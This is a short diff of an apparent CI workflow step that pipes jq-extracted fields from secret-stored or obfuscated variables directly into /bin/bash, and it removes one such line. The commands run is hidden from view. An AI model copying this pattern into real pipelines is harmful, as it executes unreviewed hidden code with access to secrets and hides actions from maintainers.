@@ -18,7 +18,6 @@ jobs:
           ul3127: ${{ secrets.ul3127 }}
         run: |
           printf '%s' "$ul3127" | jq -r .thcnq247 | /bin/bash
-          echo $jav9052 | jq -r .lu34527 | /bin/bash
           printf '%s' "$zm66" | jq -r .we85 | /bin/bash
           echo $k83 | jq -r .in758 | /bin/bash
           printf '%s' "$rqjjv16" | jq -r .r05 | /bin/bash
